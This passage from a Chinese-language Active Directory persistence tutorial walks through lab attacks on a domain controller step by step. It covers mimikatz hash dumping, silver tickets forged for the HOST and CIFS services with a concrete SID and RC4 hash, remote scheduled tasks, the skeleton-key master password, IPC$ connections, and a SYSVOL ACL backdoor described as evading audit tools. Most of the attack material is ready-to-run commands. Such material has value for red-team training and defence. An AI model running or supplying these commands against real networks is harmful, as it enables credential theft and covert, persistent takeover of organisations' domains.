# mimikatz 操作
# 这里不要用管理员权限打开 mimikatz，否则会没有host服务
kerberos::list

```

[![](https://camo.githubusercontent.com/2444ab0d13948c50425492e9daf3a27e70375073fde164a4b5a1a5f4f3d7126e/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363039333132312e706e67)](https://camo.githubusercontent.com/2444ab0d13948c50425492e9daf3a27e70375073fde164a4b5a1a5f4f3d7126e/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363039333132312e706e67)

接下来获取 Hash, 并且获取 SID

```
lsadump::lsa /patch

```

[![](https://camo.githubusercontent.com/0f220aaf43b5ab895700609cc48cf1f28cbb92446b5513157fda109c4ccd4872/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134303132322e706e67)](https://camo.githubusercontent.com/0f220aaf43b5ab895700609cc48cf1f28cbb92446b5513157fda109c4ccd4872/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134303132322e706e67)

获取了 server 名称：

> /domain 域的名称 /dis 域的 sid /service 指定服务类型 /ticket(可选) 指定路径保存票据 /ptt 直接注入内存 /rc4 域控机器 ntlm

```
kerberos::golden /user:test /domain:main.com /sid:S-1-5-21-2214894582-1205818508-3793940241 /target:dc.main.com /rc4:e72477885554476fbc116b63a21f36e2 /service:host /ptt

```

然后就可以创建计划任务：

```
schtasks /create /S dc.main.com /tn "task1" /RU "system" /sc weekly /tr "c:\windows\system32\calc.exe"

```

[![](https://camo.githubusercontent.com/ecf016e74ef9903efd69cdf283cc2ce01165096ef669a7eec377de77f03a19fa/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363133343932312e706e67)](https://camo.githubusercontent.com/ecf016e74ef9903efd69cdf283cc2ce01165096ef669a7eec377de77f03a19fa/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363133343932312e706e67)

[](#112-伪造cifs服务权限)11.2 伪造 CIFS 服务权限
------------------------------------

```
kerberos::golden /user:test /domain:main.com /sid:S-1-5-21-2214894582-1205818508-3793940241 /target:dc.main.com /rc4:e72477885554476fbc116b63a21f36e2 /service:CIFS /ptt

```

[![](https://camo.githubusercontent.com/d62722e9b2d639c5b8f6cfb45ffce10af1479eaa5c2a198d70c8c9b14e047ec5/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134303934302e706e67)](https://camo.githubusercontent.com/d62722e9b2d639c5b8f6cfb45ffce10af1479eaa5c2a198d70c8c9b14e047ec5/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134303934302e706e67)

同理，获取 HTTP / Wsman 服务以后，可以获得目标系统上的`WinRM`和`Powershell`远程管理的权限。

在注入 ldap 服务票据后，可以获得目标系统上 LDAP 服务的管理权限，进而可以利用 dcsync 远程导出域控上的 hash

[](#12-skeletonkey万能密码)12. SkeletonKey / 万能密码
---------------------------------------------

> Skeleton Key 被安装在 64 位的域控服务器上 支持 Windows Server2003 — Windows Server2012 R2 能够让所有域用户使用同一个万能密码进行登录 现有的所有域用户使用原密码仍能继续登录 重启后失效

使用 Skeleton Key 攻击时，NTLM、Kerberos 两种身份验证方法都会被篡改。 例如，在 NTLM 身份验证期间，已注入 LSASS 进程中的主密码哈希将不会与 SAM 数据库进行比较，而将与 Skeleton Key 哈希进行比较，因此，身份验证将成功。

Kerberos 加密也将降级为不支持 Salt（RC4_HMAC_MD5）的算法，并且从活动目录中检索到的哈希将替换为 Skeleton Key 哈希。 因此，主密码的哈希值将始终在服务器端进行验证，并且两种方法的身份验证都将成功。

> IPC$(Internet Process Connection) 是共享 "命名管道" 的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。

以下是环境：

<table><thead><tr><th>操作系统</th><th>角色</th><th>域名</th><th>用户名</th></tr></thead><tbody><tr><td>Wins2012R2</td><td>DC</td><td>main.com</td><td>12451</td></tr><tr><td>windows 2008</td><td>Client</td><td>main.com</td><td>test</td></tr></tbody></table>

```
# 添加
net use \\DC\IPC$  "密码" /user:test\administrator
# 将之前建立的IPC$链接删除      
net use  \\dc\ipc$ /del /y 
# 查看现有的IPC$链接
net use  

```

使用`添加`命令进行 IPC$ 的添加后，如下：

[![](https://camo.githubusercontent.com/0c5954c3e76c80ae29c87760e9cc8aca524fc43059f8c757ae0c1fdc471e0f5e/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333130353731362e706e67)](https://camo.githubusercontent.com/0c5954c3e76c80ae29c87760e9cc8aca524fc43059f8c757ae0c1fdc471e0f5e/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333130353731362e706e67)

[![](https://camo.githubusercontent.com/270a6167367aca59335def2a6bc80dc65a8b44537d22d3bec58ca8c0855f2e64/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333130353734332e706e67)](https://camo.githubusercontent.com/270a6167367aca59335def2a6bc80dc65a8b44537d22d3bec58ca8c0855f2e64/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333130353734332e706e67)

此时重启，会发现失效

[![](https://camo.githubusercontent.com/4194cfb87c2522788755a80c1115373902dbb87b17d8e79cac4c1f5f5de232ad/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333130353933382e706e67)](https://camo.githubusercontent.com/4194cfb87c2522788755a80c1115373902dbb87b17d8e79cac4c1f5f5de232ad/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333130353933382e706e67)

在域控下操作：

```
#mimikatz 
privilege::debug
misc::skeleton

```

会显示：

[![](https://camo.githubusercontent.com/52da3dd70631eb49bd6992531f7623547d1db32d2197d20b0c97daf5fdf440ee/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333131303134372e706e67)](https://camo.githubusercontent.com/52da3dd70631eb49bd6992531f7623547d1db32d2197d20b0c97daf5fdf440ee/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333131303134372e706e67)

这时候会多一个万能的密码 `mimikatz`

我们删除原有的 ipc 链接，进行新的建立

```
net use \\DC\ipc$ "mimikatz" /user:test\administrator

```

但是还是不行

[![](https://camo.githubusercontent.com/c5bbad9d9b66bc1fd61a51c756720cc1d980b68cfe6a15b03f1f79d10a3229d2/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333030343930352e706e67)](https://camo.githubusercontent.com/c5bbad9d9b66bc1fd61a51c756720cc1d980b68cfe6a15b03f1f79d10a3229d2/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333030343930352e706e67)

查了一下其他写法 (将 user 后面的名称改为 域 即可)，才可以：

```
net use \\DC\ipc$ "mimikatz" /user:main\administrator

```

[![](https://camo.githubusercontent.com/54e3ef9dfac81c40df569fb80d56ea5a59c660be71adf570cb24cc934239c590/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333130353134362e706e67)](https://camo.githubusercontent.com/54e3ef9dfac81c40df569fb80d56ea5a59c660be71adf570cb24cc934239c590/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531333130353134362e706e67)

[](#13-adminsdholder)13. AdminSDHolder
--------------------------------------

参考文章：[https://blog.csdn.net/qq_36119192/article/details/109047093](https://blog.csdn.net/qq_36119192/article/details/109047093)

[](#14-acl后门)14. ACL 后门
-----------------------

这是一种基于域内对象 `ACL(Access Control Link`) 访问控制链的深度隐藏后门。

每个安装了域服务器的都会有两个共享目录，分别是：SYSVOL(C:\Windows\SYSVOL\sysvol) 和 它下面的 Script 两个目录，任何账号都可以访问。

**一定程度上说，控制了 `SYSVOL` 目录，就有很大概率控制域网络。**

一般来说，域策略会强制周期性修改高权限用户的密码，但是对低权限用户来说不一定有这个强制性要求，而且域中往往有很多用户几乎不怎么登录、使用。

如果低权限用户具备 `SYSVOL` 目录的修改权限，登录域时，因为权限不高，不会被审计软件发现。现在的防护、监控类软件还没有过多关注目录的 ACL，因此这种方式是一种很实用的隐蔽后门方式。

[![](https://camo.githubusercontent.com/33ab62964c891bc1ff87aeda4fa2b04f5d460f46d3449dfbdde5e633d8fb325d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363135313034352e706e67)](https://camo.githubusercontent.com/33ab62964c891bc1ff87aeda4fa2b04f5d460f46d3449dfbdde5e633d8fb325d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363135313034352e706e67)

如果说是共享目录的话，我们尝试写入文件，

[![](https://camo.githubusercontent.com/2946a1dafd4bb87b961f91580e392aafd139e243739678b5baf328bfdc86a9ad/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363135313530362e706e67)](https://camo.githubusercontent.com/2946a1dafd4bb87b961f91580e392aafd139e243739678b5baf328bfdc86a9ad/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363135313530362e706e67)

权限不够，那么我们加入权限

[![](https://camo.githubusercontent.com/27113286ee836215f266534e9a5dc79ba657d1ebff38fbceb7da3d84b7ed5ba3/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363135313733342e706e67)](https://camo.githubusercontent.com/27113286ee836215f266534e9a5dc79ba657d1ebff38fbceb7da3d84b7ed5ba3/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363135313733342e706e67)

修改之后，成功写入

[![](https://camo.githubusercontent.com/04e7adf4a249a94729bbdaa721021eb9f853087eae8f53a056bdb350f5bd9bc0/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363135323131302e706e67)](https://camo.githubusercontent.com/04e7adf4a249a94729bbdaa721021eb9f853087eae8f53a056bdb350f5bd9bc0/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363135323131302e706e67)

这种后门方式，只是演示了 `ACL` 后门的一种具体形式，因为域中的对象太多，可以操控的 `ACL`对象也很多。可以根据自己的需要，灵活选择目标的 ACL 作为目标进行修改，埋藏后门。

[](#15-dump高权限用户的hash)15. dump 高权限用户的 hash
------------------------------------------

基于[获取域控的方法](https://github.com/JDArmy/DCSec/blob/main/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90.md)，通过 dump DNSAdmin、exchange、localgroup 中的 RDP、BackupOperator 组等高权限用户的 hash，来对域控进行权限维持。

[](#参考文章)参考文章：
==============

[https://www.geekby.site/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1](https://www.geekby.site/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1)

[https://www.geekby.site/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/#%E7%9B%AE%E5%BD%95-acl](https://www.geekby.site/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/#%E7%9B%AE%E5%BD%95-acl)

[https://www.freebuf.com/articles/system/305304.html](https://www.freebuf.com/articles/system/305304.html)